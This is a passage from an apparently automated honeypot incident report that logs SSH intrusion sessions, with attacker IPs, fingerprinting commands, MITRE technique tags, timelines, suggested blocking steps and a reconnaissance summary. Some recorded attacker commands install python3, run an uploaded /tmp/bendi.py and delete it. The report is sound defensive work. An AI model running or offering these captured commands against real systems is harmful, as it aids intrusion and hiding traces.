| `2026-08-11 14:44:11` | `cowrie.command.input` |
| `2026-08-11 14:44:11` | `cowrie.command.success` |
| `2026-08-11 14:44:11` | `cowrie.command.input` |
| `2026-08-11 14:44:11` | `cowrie.command.input` |
| `2026-08-11 14:44:11` | `cowrie.command.input` |
| `2026-08-11 14:44:11` | `cowrie.command.input` |
| `2026-08-11 14:44:11` | `cowrie.log.closed` |
| `2026-08-11 14:44:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3028cb36175

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-08-11 14:45 |
| **Last Seen** | 2026-08-11 14:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 14:45:21` | `cowrie.session.connect` |
| `2026-08-11 14:45:21` | `cowrie.client.version` |
| `2026-08-11 14:45:21` | `cowrie.client.kex` |
| `2026-08-11 14:45:21` | `cowrie.login.success` |
| `2026-08-11 14:45:22` | `cowrie.session.params` |
| `2026-08-11 14:45:22` | `cowrie.command.input` |
| `2026-08-11 14:45:22` | `cowrie.log.closed` |
| `2026-08-11 14:45:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40d8497726df

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-11 14:46 |
| **Last Seen** | 2026-08-11 14:46 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 14:46:37` | `cowrie.session.connect` |
| `2026-08-11 14:46:38` | `cowrie.client.version` |
| `2026-08-11 14:46:38` | `cowrie.client.kex` |
| `2026-08-11 14:46:39` | `cowrie.login.success` |
| `2026-08-11 14:46:40` | `cowrie.session.params` |
| `2026-08-11 14:46:40` | `cowrie.command.input` |
| `2026-08-11 14:46:40` | `cowrie.command.input` |
| `2026-08-11 14:46:40` | `cowrie.command.input` |
| `2026-08-11 14:46:40` | `cowrie.command.input` |
| `2026-08-11 14:46:40` | `cowrie.command.input` |
| `2026-08-11 14:46:40` | `cowrie.command.success` |
| `2026-08-11 14:46:40` | `cowrie.command.input` |
| `2026-08-11 14:46:40` | `cowrie.command.input` |
| `2026-08-11 14:46:40` | `cowrie.command.input` |
| `2026-08-11 14:46:40` | `cowrie.command.input` |
| `2026-08-11 14:46:40` | `cowrie.log.closed` |
| `2026-08-11 14:46:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-10af08ad46e2

| Field | Detail |
|---|---|
| **Source IP** | `196.219.75[.]143` |
| **First Seen** | 2026-08-11 14:46 |
| **Last Seen** | 2026-08-11 14:47 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 14:46:57` | `cowrie.session.connect` |
| `2026-08-11 14:46:57` | `cowrie.client.version` |
| `2026-08-11 14:46:57` | `cowrie.client.kex` |
| `2026-08-11 14:46:58` | `cowrie.login.success` |
| `2026-08-11 14:46:59` | `cowrie.direct-tcpip.request` |
| `2026-08-11 14:47:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.219.75[.]143` to AbuseIPDB if not already reported
- [ ] Block `196.219.75[.]143` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6906038f671f

| Field | Detail |
|---|---|
| **Source IP** | `119.160.166[.]237` |
| **First Seen** | 2026-08-11 14:47 |
| **Last Seen** | 2026-08-11 14:47 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 14:47:08` | `cowrie.session.connect` |
| `2026-08-11 14:47:09` | `cowrie.client.version` |
| `2026-08-11 14:47:09` | `cowrie.client.kex` |
| `2026-08-11 14:47:11` | `cowrie.login.success` |
| `2026-08-11 14:47:12` | `cowrie.direct-tcpip.request` |
| `2026-08-11 14:47:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.160.166[.]237` to AbuseIPDB if not already reported
- [ ] Block `119.160.166[.]237` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-903f31a3517c

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-08-11 14:48 |
| **Last Seen** | 2026-08-11 14:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 14:48:04` | `cowrie.session.connect` |
| `2026-08-11 14:48:04` | `cowrie.client.version` |
| `2026-08-11 14:48:04` | `cowrie.client.kex` |
| `2026-08-11 14:48:05` | `cowrie.login.success` |
| `2026-08-11 14:48:05` | `cowrie.session.params` |
| `2026-08-11 14:48:05` | `cowrie.command.input` |
| `2026-08-11 14:48:05` | `cowrie.log.closed` |
| `2026-08-11 14:48:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-729df1e367dd

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-11 14:48 |
| **Last Seen** | 2026-08-11 14:48 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 14:48:55` | `cowrie.session.connect` |
| `2026-08-11 14:48:55` | `cowrie.client.version` |
| `2026-08-11 14:48:55` | `cowrie.client.kex` |
| `2026-08-11 14:48:55` | `cowrie.login.success` |
| `2026-08-11 14:48:57` | `cowrie.session.params` |
| `2026-08-11 14:48:57` | `cowrie.command.input` |
| `2026-08-11 14:48:57` | `cowrie.command.input` |
| `2026-08-11 14:48:57` | `cowrie.command.input` |
| `2026-08-11 14:48:57` | `cowrie.command.input` |
| `2026-08-11 14:48:57` | `cowrie.command.input` |
| `2026-08-11 14:48:57` | `cowrie.command.success` |
| `2026-08-11 14:48:57` | `cowrie.command.input` |
| `2026-08-11 14:48:57` | `cowrie.command.input` |
| `2026-08-11 14:48:57` | `cowrie.command.input` |
| `2026-08-11 14:48:57` | `cowrie.command.input` |
| `2026-08-11 14:48:57` | `cowrie.log.closed` |
| `2026-08-11 14:48:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17eb260bd9f6

| Field | Detail |
|---|---|
| **Source IP** | `168.110.102[.]254` |
| **First Seen** | 2026-08-11 14:49 |
| **Last Seen** | 2026-08-11 14:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 14:49:49` | `cowrie.session.connect` |
| `2026-08-11 14:49:49` | `cowrie.client.version` |
| `2026-08-11 14:49:49` | `cowrie.client.kex` |
| `2026-08-11 14:49:50` | `cowrie.login.success` |
| `2026-08-11 14:49:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `168.110.102[.]254` to AbuseIPDB if not already reported
- [ ] Block `168.110.102[.]254` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89dd6fdd0543

| Field | Detail |
|---|---|
| **Source IP** | `168.110.102[.]254` |
| **First Seen** | 2026-08-11 14:49 |
| **Last Seen** | 2026-08-11 14:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 14:49:50` | `cowrie.session.connect` |
| `2026-08-11 14:49:50` | `cowrie.client.version` |
| `2026-08-11 14:49:50` | `cowrie.client.kex` |
| `2026-08-11 14:49:51` | `cowrie.login.success` |
| `2026-08-11 14:49:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `168.110.102[.]254` to AbuseIPDB if not already reported
- [ ] Block `168.110.102[.]254` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db7e89587a84

| Field | Detail |
|---|---|
| **Source IP** | `168.110.102[.]254` |
| **First Seen** | 2026-08-11 14:50 |
| **Last Seen** | 2026-08-11 14:52 |
| **Session Duration** | 131s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 14:50:15` | `cowrie.session.connect` |
| `2026-08-11 14:50:15` | `cowrie.client.version` |
| `2026-08-11 14:50:16` | `cowrie.client.kex` |
| `2026-08-11 14:50:16` | `cowrie.login.success` |
| `2026-08-11 14:50:18` | `cowrie.session.file_upload` |
| `2026-08-11 14:50:19` | `cowrie.session.params` |
| `2026-08-11 14:50:19` | `cowrie.command.input` |
| `2026-08-11 14:50:19` | `cowrie.command.input` |
| `2026-08-11 14:50:19` | `cowrie.command.input` |
| `2026-08-11 14:50:19` | `cowrie.command.failed` |
| `2026-08-11 14:50:19` | `cowrie.log.closed` |
| `2026-08-11 14:50:21` | `cowrie.session.params` |
| `2026-08-11 14:50:21` | `cowrie.command.input` |
| `2026-08-11 14:50:21` | `cowrie.log.closed` |
| `2026-08-11 14:50:22` | `cowrie.session.params` |
| `2026-08-11 14:50:22` | `cowrie.command.input` |
| `2026-08-11 14:50:22` | `cowrie.log.closed` |
| `2026-08-11 14:50:23` | `cowrie.session.params` |
| `2026-08-11 14:50:23` | `cowrie.command.input` |
| `2026-08-11 14:50:23` | `cowrie.command.failed` |
| `2026-08-11 14:50:23` | `cowrie.command.failed` |
| `2026-08-11 14:51:24` | `cowrie.session.params` |
| `2026-08-11 14:51:24` | `cowrie.command.input` |
| `2026-08-11 14:52:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `168.110.102[.]254` to AbuseIPDB if not already reported
- [ ] Block `168.110.102[.]254` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cdb19173c4bd

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-08-11 14:50 |
| **Last Seen** | 2026-08-11 14:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 14:50:49` | `cowrie.session.connect` |
| `2026-08-11 14:50:49` | `cowrie.client.version` |
| `2026-08-11 14:50:49` | `cowrie.client.kex` |
| `2026-08-11 14:50:50` | `cowrie.login.success` |
| `2026-08-11 14:50:51` | `cowrie.session.params` |
| `2026-08-11 14:50:51` | `cowrie.command.input` |
| `2026-08-11 14:50:51` | `cowrie.log.closed` |
| `2026-08-11 14:50:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a813a97bd5a5

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-11 14:51 |
| **Last Seen** | 2026-08-11 14:51 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 14:51:13` | `cowrie.session.connect` |
| `2026-08-11 14:51:13` | `cowrie.client.version` |
| `2026-08-11 14:51:13` | `cowrie.client.kex` |
| `2026-08-11 14:51:14` | `cowrie.login.success` |
| `2026-08-11 14:51:15` | `cowrie.session.params` |
| `2026-08-11 14:51:15` | `cowrie.command.input` |
| `2026-08-11 14:51:15` | `cowrie.command.input` |
| `2026-08-11 14:51:15` | `cowrie.command.input` |
| `2026-08-11 14:51:15` | `cowrie.command.input` |
| `2026-08-11 14:51:15` | `cowrie.command.input` |
| `2026-08-11 14:51:15` | `cowrie.command.success` |
| `2026-08-11 14:51:15` | `cowrie.command.input` |
| `2026-08-11 14:51:15` | `cowrie.command.input` |
| `2026-08-11 14:51:15` | `cowrie.command.input` |
| `2026-08-11 14:51:15` | `cowrie.command.input` |
| `2026-08-11 14:51:16` | `cowrie.log.closed` |
| `2026-08-11 14:51:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9f5d5c9bea9

| Field | Detail |
|---|---|
| **Source IP** | `217.24.185[.]98` |
| **First Seen** | 2026-08-11 14:52 |
| **Last Seen** | 2026-08-11 14:52 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 14:52:05` | `cowrie.session.connect` |
| `2026-08-11 14:52:05` | `cowrie.client.version` |
| `2026-08-11 14:52:05` | `cowrie.client.kex` |
| `2026-08-11 14:52:06` | `cowrie.login.success` |
| `2026-08-11 14:52:07` | `cowrie.direct-tcpip.request` |
| `2026-08-11 14:52:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.24.185[.]98` to AbuseIPDB if not already reported
- [ ] Block `217.24.185[.]98` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b505edaffee0

| Field | Detail |
|---|---|
| **Source IP** | `85.152.57[.]60` |
| **First Seen** | 2026-08-11 14:52 |
| **Last Seen** | 2026-08-11 14:52 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 14:52:11` | `cowrie.session.connect` |
| `2026-08-11 14:52:12` | `cowrie.client.version` |
| `2026-08-11 14:52:12` | `cowrie.client.kex` |
| `2026-08-11 14:52:12` | `cowrie.login.success` |
| `2026-08-11 14:52:13` | `cowrie.direct-tcpip.request` |
| `2026-08-11 14:52:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.152.57[.]60` to AbuseIPDB if not already reported
- [ ] Block `85.152.57[.]60` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ea06ade0e61

| Field | Detail |
|---|---|
| **Source IP** | `168.110.102[.]254` |
| **First Seen** | 2026-08-11 14:52 |
| **Last Seen** | 2026-08-11 14:54 |
| **Session Duration** | 130s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 14:52:42` | `cowrie.session.connect` |
| `2026-08-11 14:52:42` | `cowrie.client.version` |
| `2026-08-11 14:52:42` | `cowrie.client.kex` |
| `2026-08-11 14:52:43` | `cowrie.login.success` |
| `2026-08-11 14:52:45` | `cowrie.session.file_upload` |
| `2026-08-11 14:52:46` | `cowrie.session.params` |
| `2026-08-11 14:52:46` | `cowrie.command.input` |
| `2026-08-11 14:52:46` | `cowrie.command.input` |
| `2026-08-11 14:52:46` | `cowrie.command.input` |
| `2026-08-11 14:52:46` | `cowrie.command.failed` |
| `2026-08-11 14:52:46` | `cowrie.log.closed` |
| `2026-08-11 14:52:48` | `cowrie.session.params` |
| `2026-08-11 14:52:48` | `cowrie.command.input` |
| `2026-08-11 14:52:48` | `cowrie.log.closed` |
| `2026-08-11 14:52:49` | `cowrie.session.params` |
| `2026-08-11 14:52:49` | `cowrie.command.input` |
| `2026-08-11 14:52:49` | `cowrie.log.closed` |
| `2026-08-11 14:52:50` | `cowrie.session.params` |
| `2026-08-11 14:52:50` | `cowrie.command.input` |
| `2026-08-11 14:52:50` | `cowrie.command.failed` |
| `2026-08-11 14:52:50` | `cowrie.command.failed` |
| `2026-08-11 14:53:51` | `cowrie.session.params` |
| `2026-08-11 14:53:51` | `cowrie.command.input` |
| `2026-08-11 14:54:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `168.110.102[.]254` to AbuseIPDB if not already reported
- [ ] Block `168.110.102[.]254` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa27eab58167

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-11 14:53 |
| **Last Seen** | 2026-08-11 14:53 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 14:53:18` | `cowrie.session.connect` |
| `2026-08-11 14:53:18` | `cowrie.client.version` |
| `2026-08-11 14:53:18` | `cowrie.client.kex` |
| `2026-08-11 14:53:19` | `cowrie.login.success` |
| `2026-08-11 14:53:20` | `cowrie.session.params` |
| `2026-08-11 14:53:20` | `cowrie.command.input` |
| `2026-08-11 14:53:20` | `cowrie.command.input` |
| `2026-08-11 14:53:20` | `cowrie.command.input` |
| `2026-08-11 14:53:20` | `cowrie.command.input` |
| `2026-08-11 14:53:20` | `cowrie.command.input` |
| `2026-08-11 14:53:20` | `cowrie.command.success` |
| `2026-08-11 14:53:20` | `cowrie.command.input` |
| `2026-08-11 14:53:20` | `cowrie.command.input` |
| `2026-08-11 14:53:20` | `cowrie.command.input` |
| `2026-08-11 14:53:20` | `cowrie.command.input` |
| `2026-08-11 14:53:20` | `cowrie.log.closed` |
| `2026-08-11 14:53:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de015d91a0fa

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-08-11 14:53 |
| **Last Seen** | 2026-08-11 14:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 14:53:32` | `cowrie.session.connect` |
| `2026-08-11 14:53:32` | `cowrie.client.version` |
| `2026-08-11 14:53:32` | `cowrie.client.kex` |
| `2026-08-11 14:53:32` | `cowrie.login.success` |
| `2026-08-11 14:53:33` | `cowrie.session.params` |
| `2026-08-11 14:53:33` | `cowrie.command.input` |
| `2026-08-11 14:53:33` | `cowrie.log.closed` |
| `2026-08-11 14:53:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `164.92.115[.]22` | **30** | 2026-08-11 12:55 | 2026-08-11 14:52 | 19m | 0 | `T1592` | 🟠 MEDIUM |
| `139.199.80[.]137` | **5** | 2026-08-11 13:01 | 2026-08-11 14:52 | 0m | 0 | `T1592` | 🟢 LOW |
| `172.236.228[.]222` | **3** | 2026-08-11 14:37 | 2026-08-11 14:37 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]165` | **3** | 2026-08-11 13:43 | 2026-08-11 13:43 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]180` | **3** | 2026-08-11 14:54 | 2026-08-11 14:54 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]173` | **3** | 2026-08-11 14:36 | 2026-08-11 14:36 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]54` | **3** | 2026-08-11 14:53 | 2026-08-11 14:54 | 0m | 0 | `T1592` | 🟢 LOW |
| `91.232.238[.]83` | **3** | 2026-08-11 13:10 | 2026-08-11 13:19 | 0m | 0 | `T1592` | 🟢 LOW |
| `91.238.181[.]92` | **3** | 2026-08-11 13:31 | 2026-08-11 13:31 | 0m | 0 | `T1592` | 🟢 LOW |
| `172.105.128[.]13` | **2** | 2026-08-11 13:08 | 2026-08-11 13:08 | 0m | 0 | `T1592` | 🟢 LOW |
| `81.191.233[.]203` | **2** | 2026-08-11 13:00 | 2026-08-11 13:02 | 0m | 0 | `T1592` | 🟢 LOW |
| `106.75.26[.]244` | 1 | 2026-08-11 13:40 | 2026-08-11 13:42 | 120s | 0 | `T1592` | 🟢 LOW |
| `107.150.146[.]69` | 1 | 2026-08-11 13:10 | 2026-08-11 13:11 | 35s | 0 | `T1592` | 🟢 LOW |
| `136.116.129[.]132` | 1 | 2026-08-11 13:45 | 2026-08-11 13:45 | 0s | 0 | `T1592` | 🟢 LOW |
| `173.255.221[.]189` | 1 | 2026-08-11 13:36 | 2026-08-11 13:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `179.48.238[.]14` | 1 | 2026-08-11 13:31 | 2026-08-11 13:33 | 120s | 0 | `T1592` | 🟢 LOW |
| `193.30.245[.]7` | 1 | 2026-08-11 14:30 | 2026-08-11 14:31 | 14s | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]238` | 1 | 2026-08-11 13:21 | 2026-08-11 13:21 | 0s | 0 | `T1592` | 🟢 LOW |
| `200.104.100[.]247` | 1 | 2026-08-11 13:26 | 2026-08-11 13:28 | 120s | 0 | `T1592` | 🟢 LOW |
| `201.213.200[.]125` | 1 | 2026-08-11 14:21 | 2026-08-11 14:22 | 10s | 0 | `T1592` | 🟢 LOW |
| `210.16.100[.]120` | 1 | 2026-08-11 14:06 | 2026-08-11 14:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `220.98.54[.]97` | 1 | 2026-08-11 13:39 | 2026-08-11 13:39 | 12s | 0 | `T1592` | 🟢 LOW |
| `221.229.106[.]252` | 1 | 2026-08-11 14:16 | 2026-08-11 14:16 | 0s | 0 | `T1592` | 🟢 LOW |
| `38.172.184[.]129` | 1 | 2026-08-11 13:30 | 2026-08-11 13:30 | 10s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]152` | 1 | 2026-08-11 13:06 | 2026-08-11 13:06 | 0s | 0 | `T1592` | 🟢 LOW |
